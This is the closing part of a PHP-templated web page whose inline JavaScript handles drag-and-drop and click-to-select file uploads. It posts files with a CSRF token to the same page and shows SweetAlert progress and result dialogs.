
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');
    dropZone.addEventListener('click', () => fileInput.click());
    dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.classList.add('dragover'); });
    dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.classList.remove('dragover');
        const files = e.dataTransfer.files;
        if (files.length > 0) uploadFiles(files);
    });
    fileInput.addEventListener('change', () => {
        if (fileInput.files.length > 0) uploadFiles(fileInput.files);
    });
    function uploadFiles(files) {
        const formData = new FormData();
        formData.append('csrf', '<?= Security::escape($csrf) ?>');
        formData.append('action', 'upload');
        for (let i = 0; i < files.length; i++) {
            formData.append('files[]', files[i]);
        }
        Swal.fire({ title: 'Uploading...', allowOutsideClick: false, didOpen: () => { Swal.showLoading() } });
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(response => response.text())
            .then(() => {
                Swal.fire({ icon: 'success', title: 'Uploaded', text: 'Files uploaded successfully', timer: 1500, showConfirmButton: false })
                    .then(() => { window.location.reload(); });
            })
            .catch(error => {
                Swal.fire({ icon: 'error', title: 'Upload Failed', text: error.message });
            });
    }
</script>
</body>

</html>